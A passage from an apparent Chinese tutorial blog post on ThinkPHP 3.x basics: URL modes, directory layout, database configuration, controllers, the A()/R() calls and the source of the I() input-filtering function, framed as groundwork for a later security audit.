+本机地址/入口文件/?m=模块目录&amp;c=控制器&amp;a=方法（操作）</code></pre><p>PATHINFO模式:</p>
+<pre><code>http://www.tp.cn/index.php/home/index/index
+本机地址/入口文件/模块目录/控制器/方法（操作）</code></pre><h3 id="控制器"><a href="#控制器" class="headerlink" title="控制器"></a>控制器</h3><p>在了解控制器之前，最好先去搞一个手册，看看它的目录结构是怎么样的，这样后面才不会晕，这里我借用一下手册里的目录结构：</p>
+<pre><code>www WEB部署目录（或者子目录）
+├─index.php 入口文件
+├─README.md README文件 
+├─Application 应用目录 
+├─Public 资源文件目录 
+└─ThinkPHP 框架目录</code></pre><h4 id="开启页面Trace"><a href="#开启页面Trace" class="headerlink" title="开启页面Trace"></a>开启页面Trace</h4><p>去config.php中添加一行代码，开启页面Trach调试</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">// 显示页面Trace信息</span>
+<span class="token string">'SHOW_PAGE_TRACE'</span> <span class="token operator">=</span><span class="token operator">></span><span class="token boolean">true</span><span class="token punctuation">,</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<h4 id="配置数据库"><a href="#配置数据库" class="headerlink" title="配置数据库"></a>配置数据库</h4><p>在 <strong>\Application\Common\Conf/config.php</strong>下配置数据库信息</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">return</span> <span class="token keyword">array</span><span class="token punctuation">(</span>
+    <span class="token comment" spellcheck="true">//数据库配置信息</span>
+    <span class="token string">'DB_TYPE'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'mysql'</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 数据库类型</span>
+    <span class="token string">'DB_HOST'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 服务器地址</span>
+    <span class="token string">'DB_NAME'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'thinkphp'</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 数据库名</span>
+    <span class="token string">'DB_USER'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'root'</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 用户名</span>
+    <span class="token string">'DB_PWD'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'123456'</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 密码</span>
+    <span class="token string">'DB_PORT'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">3306</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 端口</span>
+    <span class="token string">'DB_PREFIX'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'think_'</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 数据库表前缀</span>
+    <span class="token string">'DB_CHARSET'</span><span class="token operator">=</span><span class="token operator">></span> <span class="token string">'utf8'</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 字符集</span>
+    <span class="token string">'DB_DEBUG'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token constant">TRUE</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 数据库调试模式 开启后可以记录SQL日志</span>
+<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>现在去Home下新建一个User控制器，在里面新建一个getUser方法，测试数据库与T页面race是否正常：</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">namespace</span> <span class="token package">Home<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span>
+<span class="token keyword">use</span> <span class="token package">Think<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span>
+<span class="token keyword">class</span> <span class="token class-name">UserController</span> <span class="token keyword">extends</span> <span class="token class-name">Controller</span>
+<span class="token punctuation">{</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token comment" spellcheck="true">// 定义$id,GET接收,默认值为1,强制转型int</span>
+        <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">I</span><span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'intval'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token comment" spellcheck="true">// 定义$data接收查询的返回值</span>
+        <span class="token variable">$data</span>  <span class="token operator">=</span> <span class="token function">M</span><span class="token punctuation">(</span><span class="token string">'user'</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">where</span><span class="token punctuation">(</span><span class="token string">"id={$id}"</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">select</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token comment" spellcheck="true">// dump() = var_dump()</span>
+        <span class="token function">dump</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><a href="https://imgtu.com/i/2h5iT0" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://z3.ax1x.com/2021/06/11/2h5iT0.png" alt="2h5iT0.png"></a></p>
+<h4 id="调用控制器方法"><a href="#调用控制器方法" class="headerlink" title="调用控制器方法"></a>调用控制器方法</h4><p>这里的调用控制器方法，使用的是<strong>R() 和 A()方法</strong>，现在我要从Iindex控制器下的getUser方法，访问User控制器下的userInfo方法：</p>
+<pre class="line-numbers language-php"><code class="language-php">    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token comment" spellcheck="true">// 定义$user访问User控制器</span>
+        <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">A</span><span class="token punctuation">(</span><span class="token string">'User'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">userInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment" spellcheck="true">// 或者 R("User/userInfo");</span>
+    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><a href="https://imgtu.com/i/2hHiJP" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://z3.ax1x.com/2021/06/11/2hHiJP.png" alt="2hHiJP.png"></a></p>
+<p>在后面的框架安全审计中，遇到 <strong>A()、R()</strong> 这两个方法要跟进看一下。在上面的代码里，我用 <strong>I()方法</strong>来接收用户前台传递的参数id，这个方法也是官方拓建的方法，因为它非常灵活，而且相对安全，这是这个方法的源码：</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">/**
+ * 获取输入参数 支持过滤和默认值
+ * 使用方法:
+ * &lt;code>
+ * I('id',0); 获取id参数 自动判断get或者post
+ * I('post.name','','htmlspecialchars'); 获取$_POST['name']
+ * I('get.'); 获取$_GET
+ * &lt;/code>
+ * @param string $name 变量的名称 支持指定类型
+ * @param mixed $default 不存在的时候默认值
+ * @param mixed $filter 参数过滤方法
+ * @param mixed $datas 要获取的额外数据源
+ * @return mixed
+ */</span>
+<span class="token keyword">function</span> <span class="token function">I</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$default</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token variable">$filter</span><span class="token operator">=</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token variable">$datas</span><span class="token operator">=</span><span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 指定修饰符</span>
+        <span class="token function">list</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$type</span><span class="token punctuation">)</span>     <span class="token operator">=</span>    <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token function">C</span><span class="token punctuation">(</span><span class="token string">'VAR_AUTO_STRING'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 默认强制转换为字符串</span>
+        <span class="token variable">$type</span>   <span class="token operator">=</span>   <span class="token string">'s'</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 指定参数来源</span>
+        <span class="token function">list</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span><span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token operator">=</span>   <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 默认为自动判断</span>
+        <span class="token variable">$method</span> <span class="token operator">=</span>   <span class="token string">'param'</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">switch</span><span class="token punctuation">(</span><span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">case</span> <span class="token string">'get'</span>     <span class="token punctuation">:</span>   <span class="token variable">$input</span> <span class="token operator">=</span><span class="token operator">&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span>
+        <span class="token keyword">case</span> <span class="token string">'post'</span>    <span class="token punctuation">:</span>   <span class="token variable">$input</span> <span class="token operator">=</span><span class="token operator">&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span>
+        <span class="token keyword">case</span> <span class="token string">'put'</span>     <span class="token punctuation">:</span>   <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span>'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//input'), $input);break;</span>
+        <span class="token keyword">case</span> <span class="token string">'param'</span>   <span class="token punctuation">:</span>
+            <span class="token keyword">switch</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REQUEST_METHOD'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token keyword">case</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>
+                    <span class="token variable">$input</span>  <span class="token operator">=</span>  <span class="token variable">$_POST</span><span class="token punctuation">;</span>
+                    <span class="token keyword">break</span><span class="token punctuation">;</span>
+                <span class="token keyword">case</span> <span class="token string">'PUT'</span><span class="token punctuation">:</span>
+                    <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span>'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//input'), $input);</span>
+                    <span class="token keyword">break</span><span class="token punctuation">;</span>
+                <span class="token keyword">default</span><span class="token punctuation">:</span>
+                    <span class="token variable">$input</span>  <span class="token operator">=</span>  <span class="token variable">$_GET</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+            <span class="token keyword">break</span><span class="token punctuation">;</span>
+        <span class="token keyword">case</span> <span class="token string">'path'</span>    <span class="token punctuation">:</span>   
+            <span class="token variable">$input</span>  <span class="token operator">=</span>   <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'PATH_INFO'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+                <span class="token variable">$depr</span>   <span class="token operator">=</span>   <span class="token function">C</span><span class="token punctuation">(</span><span class="token string">'URL_PATHINFO_DEPR'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token variable">$input</span>  <span class="token operator">=</span>   <span class="token function">explode</span><span class="token punctuation">(</span><span class="token variable">$depr</span><span class="token punctuation">,</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'PATH_INFO'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$depr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            
+            <span class="token punctuation">}</span>
+            <span class="token keyword">break</span><span class="token punctuation">;</span>
+        <span class="token keyword">case</span> <span class="token string">'request'</span> <span class="token punctuation">:</span>   <span class="token variable">$input</span> <span class="token operator">=</span><span class="token operator">&amp;</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">;</span>   <span class="token keyword">break</span><span class="token punctuation">;</span>
+        <span class="token keyword">case</span> <span class="token string">'session'</span> <span class="token punctuation">:</span>   <span class="token variable">$input</span> <span class="token operator">=</span><span class="token operator">&amp;</span> <span class="token variable">$_SESSION</span><span class="token punctuation">;</span>   <span class="token keyword">break</span><span class="token punctuation">;</span>
+        <span class="token keyword">case</span> <span class="token string">'cookie'</span>  <span class="token punctuation">:</span>   <span class="token variable">$input</span> <span class="token operator">=</span><span class="token operator">&amp;</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">;</span>    <span class="token keyword">break</span><span class="token punctuation">;</span>
+        <span class="token keyword">case</span> <span class="token string">'server'</span>  <span class="token punctuation">:</span>   <span class="token variable">$input</span> <span class="token operator">=</span><span class="token operator">&amp;</span> <span class="token variable">$_SERVER</span><span class="token punctuation">;</span>    <span class="token keyword">break</span><span class="token punctuation">;</span>
+        <span class="token keyword">case</span> <span class="token string">'globals'</span> <span class="token punctuation">:</span>   <span class="token variable">$input</span> <span class="token operator">=</span><span class="token operator">&amp;</span> <span class="token variable">$GLOBALS</span><span class="token punctuation">;</span>    <span class="token keyword">break</span><span class="token punctuation">;</span>
+        <span class="token keyword">case</span> <span class="token string">'data'</span>    <span class="token punctuation">:</span>   <span class="token variable">$input</span> <span class="token operator">=</span><span class="token operator">&amp;</span> <span class="token variable">$datas</span><span class="token punctuation">;</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>
+        <span class="token keyword">default</span><span class="token punctuation">:</span>
+            <span class="token keyword">return</span> <span class="token keyword">NULL</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 获取全部变量</span>
+        <span class="token variable">$data</span>       <span class="token operator">=</span>   <span class="token variable">$input</span><span class="token punctuation">;</span>
+        <span class="token variable">$filters</span>    <span class="token operator">=</span>   <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$filter</span><span class="token punctuation">:</span><span class="token function">C</span><span class="token punctuation">(</span><span class="token string">'DEFAULT_FILTER'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$filters</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$filters</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+                <span class="token variable">$filters</span>    <span class="token operator">=</span>   <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">,</span><span class="token variable">$filters</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+            <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$filters</span> <span class="token keyword">as</span> <span class="token variable">$filter</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+                <span class="token variable">$data</span>   <span class="token operator">=</span>   <span class="token function">array_map_recursive</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 参数过滤</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span><span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 取值操作</span>
+        <span class="token variable">$data</span>       <span class="token operator">=</span>   <span class="token variable">$input</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token variable">$filters</span>    <span class="token operator">=</span>   <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$filter</span><span class="token punctuation">:</span><span class="token function">C</span><span class="token punctuation">(</span><span class="token string">'DEFAULT_FILTER'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$filters</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$filters</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+                <span class="token variable">$filters</span>    <span class="token operator">=</span>   <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">,</span><span class="token variable">$filters</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span><span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token function">is_int</span><span class="token punctuation">(</span><span class="token variable">$filters</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+                <span class="token variable">$filters</span>    <span class="token operator">=</span>   <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$filters</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+
+            <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$filters</span> <span class="token keyword">as</span> <span class="token variable">$filter</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    <span class="token variable">$data</span>   <span class="token operator">=</span>   <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">array_map_recursive</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token variable">$filter</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 参数过滤</span>
+                <span class="token punctuation">}</span><span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token operator">===</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+                    <span class="token comment" spellcheck="true">// 支持正则验证</span>
+                    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">!==</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+                        <span class="token keyword">return</span>   <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$default</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$default</span> <span class="token punctuation">:</span> <span class="token keyword">NULL</span><span class="token punctuation">;</span>
+                    <span class="token punctuation">}</span>
+                <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+                    <span class="token variable">$data</span>   <span class="token operator">=</span>   <span class="token function">filter_var</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span><span class="token function">is_int</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$filter</span> <span class="token punctuation">:</span> <span class="token function">filter_id</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token boolean">false</span> <span class="token operator">===</span> <span class="token variable">$data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                        <span class="token keyword">return</span>   <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$default</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$default</span> <span class="token punctuation">:</span> <span class="token keyword">NULL</span><span class="token punctuation">;</span>
+                    <span class="token punctuation">}</span>
+                <span class="token punctuation">}</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+            <span class="token keyword">switch</span><span class="token punctuation">(</span><span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+                <span class="token keyword">case</span> <span class="token string">'a'</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">// 数组</span>
+                    <span class="token variable">$data</span>     <span class="token operator">=</span>    <span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">)</span><span class="token variable">$data</span><span class="token punctuation">;</span>
+                    <span class="token keyword">break</span><span class="token punctuation">;</span>
+                <span class="token keyword">case</span> <span class="token string">'d'</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">// 数字</span>
+                    <span class="token variable">$data</span>     <span class="token operator">=</span>    <span class="token punctuation">(</span>int<span class="token punctuation">)</span><span class="token variable">$data</span><span class="token punctuation">;</span>
+                    <span class="token keyword">break</span><span class="token punctuation">;</span>
+                <span class="token keyword">case</span> <span class="token string">'f'</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">// 浮点</span>
+                    <span class="token variable">$data</span>     <span class="token operator">=</span>    <span class="token punctuation">(</span>float<span class="token punctuation">)</span><span class="token variable">$data</span><span class="token punctuation">;</span>
+                    <span class="token keyword">break</span><span class="token punctuation">;</span>
+                <span class="token keyword">case</span> <span class="token string">'b'</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">// 布尔</span>
+                    <span class="token variable">$data</span>     <span class="token operator">=</span>    <span class="token punctuation">(</span>boolean<span class="token punctuation">)</span><span class="token variable">$data</span><span class="token punctuation">;</span>
+                    <span class="token keyword">break</span><span class="token punctuation">;</span>
+                <span class="token keyword">case</span> <span class="token string">'s'</span><span class="token punctuation">:</span>   <span class="token comment" spellcheck="true">// 字符串</span>
+                <span class="token keyword">default</span><span class="token punctuation">:</span>
+                    <span class="token variable">$data</span>   <span class="token operator">=</span>   <span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$data</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 变量默认值</span>
+        <span class="token variable">$data</span>       <span class="token operator">=</span>    <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$default</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$default</span><span class="token punctuation">:</span><span class="token keyword">NULL</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">array_walk_recursive</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span><span class="token string">'think_filter'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token variable">$data</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>现在我们在User控制器下，构造一个getArg()方法用于测试这个 I()方法，且从Index控制器的getArgs()调用：</p>
+<p>getArg()：</p>
+<pre class="line-numbers language-php"><code class="language-php">    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getArg</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token comment" spellcheck="true">// 定义$g接收GET的所有参数和值</span>
+        <span class="token variable">$g</span> <span class="token operator">=</span> <span class="token function">I</span><span class="token punctuation">(</span><span class="token string">"get."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">dump</span><span class="token punctuation">(</span><span class="token variable">$g</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> <span class="token string">"&lt;hr>"</span><span class="token punctuation">;</span>
+
+        <span class="token comment" spellcheck="true">// g1接收指定参数和值</span>
+        <span class="token variable">$g1</span> <span class="token operator">=</span> <span class="token function">I</span><span class="token punctuation">(</span><span class="token string">"get.name"</span><span class="token punctuation">,</span><span class="token string">'root'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">dump</span><span class="token punctuation">(</span><span class="token variable">$g1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> <span class="token string">"&lt;hr>"</span><span class="token punctuation">;</span>
+
+        <span class="token comment" spellcheck="true">// 定义$p和$p1 接收所有POST和指定POST参数和值</span>
+        <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token function">I</span><span class="token punctuation">(</span><span class="token string">"post."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">dump</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> <span class="token string">"&lt;hr>"</span><span class="token punctuation">;</span>
+
+        <span class="token variable">$p1</span> <span class="token operator">=</span> <span class="token function">I</span><span class="token punctuation">(</span><span class="token string">"post.name"</span><span class="token punctuation">,</span><span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">dump</span><span class="token punctuation">(</span><span class="token variable">$p1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
